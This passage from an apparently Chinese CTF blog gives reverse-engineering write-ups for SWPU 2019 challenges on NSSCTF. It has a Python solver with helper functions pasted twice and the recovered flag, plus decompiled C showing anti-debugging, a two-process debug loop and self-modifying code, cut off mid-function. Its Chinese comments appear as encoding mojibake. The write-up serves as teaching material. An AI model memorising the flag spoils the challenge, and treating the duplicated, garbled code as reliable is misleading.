</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = c &lt;&lt; <span class="number">1</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> c &amp; <span class="number">0x100</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥å³è¾¹0çš„ä¸ªæ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_0</span>(<span class="params">c</span>): </span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> c &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        c = c &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_0</span>(<span class="params">c</span>):</span><br><span class="line">    res1 = check_0(c) + check_1(c)</span><br><span class="line">    res2 = ((c &lt;&lt; check_1(c)) &amp; <span class="number">0xff</span>) &gt;&gt; res1</span><br><span class="line">    res3 = ((c &gt;&gt; (<span class="number">8</span> - check_1(c))) &lt;&lt; check_1(c)) | ((c &lt;&lt; (<span class="number">8</span> - check_0(c)) &amp; <span class="number">0xff</span>) &gt;&gt; res1)</span><br><span class="line">    <span class="keyword">return</span> [res1, res2, res3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_part</span>(<span class="params">c,s2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥å­—ç¬¦çš„åˆ†ç±»ï¼Œå¹¶è¿”å›ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦&quot;&quot;&quot;</span></span><br><span class="line">    tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;  03\&quot;3   0 203\&quot;   $ &#x27;</span>))</span><br><span class="line">    tmp2=check_0(c) | (<span class="number">16</span>*check_1(c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">set</span>(s2):</span><br><span class="line">        <span class="keyword">if</span> tmp2 ==<span class="built_in">ord</span>(i):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">classify</span>():</span><br><span class="line">    for_each=string.ascii_lowercase+string.ascii_uppercase+string.digits</span><br><span class="line">    second_part_res = <span class="string">&#x27;  03\&quot;3   0 203\&quot;   $ &#x27;</span></span><br><span class="line">    d=<span class="built_in">dict</span>.fromkeys(<span class="built_in">list</span>(<span class="built_in">set</span>(second_part_res)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">set</span>(second_part_res)):</span><br><span class="line">        d[i]=[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> for_each:</span><br><span class="line">        tmp=check_part(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            d[tmp].append(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>(<span class="params">c,v14</span>):</span><br><span class="line">    exam=&#123;c:generate_0(<span class="built_in">ord</span>(c))&#125;</span><br><span class="line">    v14=v14-(<span class="number">8</span>-exam[c][<span class="number">0</span>])</span><br><span class="line">    tmp=exam[c][<span class="number">1</span>]&lt;&lt;v14</span><br><span class="line">    <span class="keyword">return</span> tmp,v14</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">c,v14</span>):</span><br><span class="line">    exam=&#123;c:generate_0(<span class="built_in">ord</span>(c))&#125;</span><br><span class="line">    v14=v14-exam[c][<span class="number">0</span>]</span><br><span class="line">    tmp=exam[c][<span class="number">2</span>]&lt;&lt;v14</span><br><span class="line">    <span class="keyword">return</span> tmp,v14</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥å·¦ç§»è¿›ä½ä½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_1</span>(<span class="params">c</span>): </span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = c &lt;&lt; <span class="number">1</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> c &amp; <span class="number">0x100</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥å³è¾¹0çš„ä¸ªæ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_0</span>(<span class="params">c</span>): </span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> c &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        c = c &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_0</span>(<span class="params">c</span>):</span><br><span class="line">    res1 = check_0(c) + check_1(c)</span><br><span class="line">    res2 = ((c &lt;&lt; check_1(c)) &amp; <span class="number">0xff</span>) &gt;&gt; res1</span><br><span class="line">    res3 = ((c &gt;&gt; (<span class="number">8</span> - check_1(c))) &lt;&lt; check_1(c)) | ((c &lt;&lt; (<span class="number">8</span> - check_0(c)) &amp; <span class="number">0xff</span>) &gt;&gt; res1)</span><br><span class="line">    <span class="keyword">return</span> [res1, res2, res3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†ç±»æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_part</span>(<span class="params">c</span>):</span><br><span class="line">    tmp = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;  03\&quot;3   0 203\&quot;   $ &#x27;</span>))</span><br><span class="line">    tmp2 = check_0(c) | (<span class="number">16</span> * check_1(c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">if</span> tmp2 == <span class="built_in">ord</span>(i):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†ç±»å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">classify</span>():</span><br><span class="line">    for_each = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    second_part_res = <span class="string">&#x27;  03\&quot;3   0 203\&quot;   $ &#x27;</span></span><br><span class="line">    d = <span class="built_in">dict</span>.fromkeys(<span class="built_in">list</span>(<span class="built_in">set</span>(second_part_res)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">set</span>(second_part_res)):</span><br><span class="line">        d[i] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> for_each:</span><br><span class="line">        tmp = check_part(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            d[tmp].append(i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•å‡½æ•°1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>(<span class="params">c, v14</span>):</span><br><span class="line">    exam = &#123;c: generate_0(<span class="built_in">ord</span>(c))&#125;</span><br><span class="line">    v14 = v14 - (<span class="number">8</span> - exam[c][<span class="number">0</span>])</span><br><span class="line">    tmp = exam[c][<span class="number">1</span>] &lt;&lt; v14</span><br><span class="line">    <span class="keyword">return</span> tmp, v14</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•å‡½æ•°2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">c, v14</span>):</span><br><span class="line">    exam = &#123;c: generate_0(<span class="built_in">ord</span>(c))&#125;</span><br><span class="line">    v14 = v14 - exam[c][<span class="number">0</span>]</span><br><span class="line">    tmp = exam[c][<span class="number">2</span>] &lt;&lt; v14</span><br><span class="line">    <span class="keyword">return</span> tmp, v14</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ç¬¬ä¸€ä¸ªéƒ¨åˆ†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_first_part</span>(<span class="params">s</span>):</span><br><span class="line">    v14 = <span class="number">0x20</span></span><br><span class="line">    tmp, v14 = test_1(s[<span class="number">0</span>], v14)</span><br><span class="line">    tmp2, v14 = test_1(s[<span class="number">1</span>], v14)</span><br><span class="line">    tmp3, v14 = test_1(s[<span class="number">2</span>], v14)</span><br><span class="line">    tmp4, v14 = test_1(s[<span class="number">3</span>], v14)</span><br><span class="line">    tmp5, v14 = test_2(s[<span class="number">0</span>], v14)</span><br><span class="line">    tmp6, v14 = test_2(s[<span class="number">1</span>], v14)</span><br><span class="line">    tmp7, v14 = test_2(s[<span class="number">2</span>], v14)</span><br><span class="line">    tmp8, v14 = test_2(s[<span class="number">3</span>], v14)</span><br><span class="line">    <span class="keyword">return</span> tmp | tmp2 | tmp3 | tmp4 | tmp5 | tmp6 | tmp7 | tmp8</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥ç¬¬ä¸€ä¸ªéƒ¨åˆ†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_first_part</span>(<span class="params">second_part, first_part, d</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d[second_part[<span class="number">0</span>]]:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> d[second_part[<span class="number">1</span>]]:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> d[second_part[<span class="number">2</span>]]:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> d[second_part[<span class="number">3</span>]]:</span><br><span class="line">                    tmp = i + j + k + m</span><br><span class="line">                    <span class="keyword">if</span> calc_first_part(tmp) == first_part:</span><br><span class="line">                        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»ç¨‹åº</span></span><br><span class="line">d = classify()</span><br><span class="line">s2 = <span class="string">&#x27;  03\&quot;3   0 203\&quot;   $ &#x27;</span></span><br><span class="line">s = [<span class="string">&#x27;08&#x27;</span>, <span class="string">&#x27;EA&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;DE&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;3B&#x27;</span>, <span class="string">&#x27;BE&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;D4&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;14&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;B7&#x27;</span>, <span class="string">&#x27;AF&#x27;</span>, <span class="string">&#x27;14&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;7F&#x27;</span>, <span class="string">&#x27;CF&#x27;</span>]</span><br><span class="line">flag = <span class="string">&#x27;swpuctf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    first_part = <span class="built_in">int</span>(s[<span class="number">3</span> + <span class="number">4</span> * i] + s[<span class="number">2</span> + <span class="number">4</span> * i] + s[<span class="number">1</span> + <span class="number">4</span> * i] + s[<span class="number">4</span> * i], <span class="number">16</span>)</span><br><span class="line">    second_part = s2[i * <span class="number">4</span>:i * <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">    res = check_first_part(second_part, first_part, d)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">        flag += res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += res + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#swpuctf&#123;we18-l8co-m1e4-58to-swpu&#125;</span></span><br></pre></td></tr></table></figure><h2 id="EasiestReï¼ˆåŒè¿›ç¨‹-è‡ªä¿®æ”¹-èƒŒåŒ…åŠ å¯†ï¼‰"><a href="#EasiestReï¼ˆåŒè¿›ç¨‹-è‡ªä¿®æ”¹-èƒŒåŒ…åŠ å¯†ï¼‰" class="headerlink" title="EasiestReï¼ˆåŒè¿›ç¨‹+è‡ªä¿®æ”¹+èƒŒåŒ…åŠ å¯†ï¼‰"></a>EasiestReï¼ˆåŒè¿›ç¨‹+è‡ªä¿®æ”¹+èƒŒåŒ…åŠ å¯†ï¼‰</h2><p><a href="https://www.nssctf.cn/problem/40">[SWPU 2019]EasiestRe | NSSCTF</a></p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h4><p>è¿›æ¥å…ˆçœ‹åˆ°IsDebuggerPresentï¼Œè¿è¡Œä¸€ä¸‹å‘ç°å’Œç›´æ¥æ‰“å¼€çš„ç»“æœä¸ä¸€æ ·ï¼ŒåŒè¿›ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( IsDebuggerPresent() )  <span class="comment">//è°ƒè¯•å™¨è¿›ç¨‹</span></span><br><span class="line">.....</span><br><span class="line"><span class="keyword">if</span> ( CreateProcessA(Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )  <span class="comment">//æ­£å¸¸è¿›ç¨‹</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  PVOID lpBaseAddress; <span class="comment">// [esp+18h] [ebp-558h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+1Fh] [ebp-551h]</span></span><br><span class="line">  DWORD dwContinueStatus; <span class="comment">// [esp+20h] [ebp-550h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+28h] [ebp-548h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+8Fh] [ebp-4E1h]</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [esp+94h] [ebp-4DCh] BYREF</span></span><br><span class="line">  HANDLE hThread; <span class="comment">// [esp+364h] [ebp-20Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+368h] [ebp-208h]</span></span><br><span class="line">  SIZE_T NumberOfBytesRead[<span class="number">3</span>]; <span class="comment">// [esp+370h] [ebp-200h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesWritten[<span class="number">3</span>]; <span class="comment">// [esp+37Ch] [ebp-1F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">60</span>]; <span class="comment">// [esp+388h] [ebp-1E8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">40</span>]; <span class="comment">// [esp+3C4h] [ebp-1ACh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">16</span>]; <span class="comment">// [esp+3ECh] [ebp-184h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+3FCh] [ebp-174h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+448h] [ebp-128h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">267</span>]; <span class="comment">// [esp+460h] [ebp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  j__memset(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">  v16[<span class="number">0</span>] = <span class="number">0x90</span>;</span><br><span class="line">  v16[<span class="number">1</span>] = <span class="number">0x83</span>;</span><br><span class="line">  v16[<span class="number">2</span>] = <span class="number">0x7D</span>;</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">0xF8</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">0x18</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">0x7D</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">0x11</span>;</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">0x90</span>;</span><br><span class="line">  v15[<span class="number">1</span>] = <span class="number">0xF</span>;</span><br><span class="line">  v15[<span class="number">2</span>] = <span class="number">0xB6</span>;</span><br><span class="line">  v15[<span class="number">3</span>] = <span class="number">0x55</span>;</span><br><span class="line">  v15[<span class="number">4</span>] = <span class="number">0xF7</span>;</span><br><span class="line">  v15[<span class="number">5</span>] = <span class="number">0x8B</span>;</span><br><span class="line">  v15[<span class="number">6</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v15[<span class="number">7</span>] = <span class="number">8</span>;</span><br><span class="line">  v15[<span class="number">8</span>] = <span class="number">0x8B</span>;</span><br><span class="line">  v15[<span class="number">9</span>] = <span class="number">4</span>;</span><br><span class="line">  v15[<span class="number">10</span>] = <span class="number">0x90</span>;</span><br><span class="line">  v15[<span class="number">11</span>] = <span class="number">0xF</span>;</span><br><span class="line">  v15[<span class="number">12</span>] = <span class="number">0xAF</span>;</span><br><span class="line">  v15[<span class="number">13</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v15[<span class="number">14</span>] = <span class="number">0xFC</span>;</span><br><span class="line">  v15[<span class="number">15</span>] = <span class="number">0x33</span>;</span><br><span class="line">  v15[<span class="number">16</span>] = <span class="number">0xD2</span>;</span><br><span class="line">  v15[<span class="number">17</span>] = <span class="number">0xF7</span>;</span><br><span class="line">  v15[<span class="number">18</span>] = <span class="number">0x75</span>;</span><br><span class="line">  v15[<span class="number">19</span>] = <span class="number">0xF8</span>;</span><br><span class="line">  v15[<span class="number">20</span>] = <span class="number">0xF</span>;</span><br><span class="line">  v15[<span class="number">21</span>] = <span class="number">0xB6</span>;</span><br><span class="line">  v15[<span class="number">22</span>] = <span class="number">0x4D</span>;</span><br><span class="line">  v15[<span class="number">23</span>] = <span class="number">0xF7</span>;</span><br><span class="line">  v15[<span class="number">24</span>] = <span class="number">0x8B</span>;</span><br><span class="line">  v15[<span class="number">25</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v15[<span class="number">26</span>] = <span class="number">0xC</span>;</span><br><span class="line">  v15[<span class="number">27</span>] = <span class="number">0x89</span>;</span><br><span class="line">  v15[<span class="number">28</span>] = <span class="number">0x14</span>;</span><br><span class="line">  v15[<span class="number">29</span>] = <span class="number">0x88</span>;</span><br><span class="line">  j__memset(Buffer, <span class="number">0</span>, <span class="number">0x32u</span>);</span><br><span class="line">  NumberOfBytesWritten[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )                    <span class="comment">// è°ƒè¯•å™¨è¿›ç¨‹</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetStartupInfoA(&amp;StartupInfo);</span><br><span class="line">    GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( CreateProcessA(Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )<span class="comment">// åˆ›å»ºæ–°è¿›ç¨‹</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">      <span class="keyword">while</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        dwContinueStatus = <span class="number">0x10002</span>;</span><br><span class="line">        WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        <span class="keyword">switch</span> ( DebugEvent.dwDebugEventCode )  <span class="comment">// å¤„ç†è°ƒè¯•äº‹ä»¶</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">            <span class="keyword">if</span> ( DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == <span class="number">0x80000003</span> )<span class="comment">// é‡åˆ°è°ƒè¯•æ–­ç‚¹</span></span><br><span class="line">            &#123;</span><br><span class="line">              v8 = <span class="number">1</span>;                           <span class="comment">// ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œè·³è¿‡å½“å‰å¼‚å¸¸</span></span><br><span class="line">              dwContinueStatus = <span class="number">0x10002</span>;</span><br><span class="line">              lpBaseAddress = DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress;<span class="comment">// ä¿å­˜å¼‚å¸¸çš„åœ°å€ï¼ˆå³æ–­ç‚¹åœ°å€ï¼‰</span></span><br><span class="line">              ReadProcessMemory(                <span class="comment">// è¯»å– 35 å­—èŠ‚çš„å†…å­˜æ•°æ®åˆ°bufferé‡Œ</span></span><br><span class="line">                ProcessInformation.hProcess,</span><br><span class="line">                DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress,</span><br><span class="line">                Buffer,</span><br><span class="line">                <span class="number">0x23u</span>,</span><br><span class="line">                NumberOfBytesRead);</span><br><span class="line">              <span class="keyword">if</span> ( NumberOfBytesRead[<span class="number">0</span>] )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">35</span> &amp;&amp; Buffer[i] == <span class="number">0x90</span>; ++i )<span class="comment">// æ£€æŸ¥nop</span></span><br><span class="line">                  ;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( i == <span class="number">1</span> )</span><br><span class="line">                v8 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v8 )                         <span class="comment">// v8é0åˆ™ç»§ç»­æ‰§è¡Œï¼Œv8ä¸º0åˆ™è·³è½¬åˆ°dwContinueStatus = 0x80010001;</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( i )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    Context.ContextFlags = <span class="number">65543</span>;</span><br><span class="line">                    hThread = OpenThread(<span class="number">0x1FFFFFu</span>, <span class="number">0</span>, DebugEvent.dwThreadId);</span><br><span class="line">                    <span class="keyword">if</span> ( !GetThreadContext(hThread, &amp;Context) )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">                    ++Context.Eip;</span><br><span class="line">                    <span class="keyword">if</span> ( SetThreadContext(hThread, &amp;Context) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      dwContinueStatus = <span class="number">0x10002</span>;</span><br><span class="line">                      CloseHandle(hThread);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">LABEL_31:</span><br><span class="line">                    ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x80010001</span>);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">7</span>:                       <span class="comment">// å°†v16çš„æ•°æ®å†™å…¥lpBaseAddress</span></span><br><span class="line">                                                <span class="comment">// ç„¶åè¯»å–lpBaseAddress å¤„çš„æ•°æ®å¹¶å­˜å‚¨åœ¨ Buffer ä¸­</span></span><br><span class="line">                                                <span class="comment">// æˆåŠŸå†™å…¥ 7 å­—èŠ‚æ•°æ®åˆ™ç»§ç»­æ‰§è¡Œç¨‹åº</span></span><br><span class="line">                    WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, v16, <span class="number">7u</span>, NumberOfBytesWritten);</span><br><span class="line">                    <span class="keyword">if</span> ( NumberOfBytesWritten[<span class="number">0</span>] == <span class="number">7</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ReadProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, <span class="number">7u</span>, NumberOfBytesRead);</span><br><span class="line">                      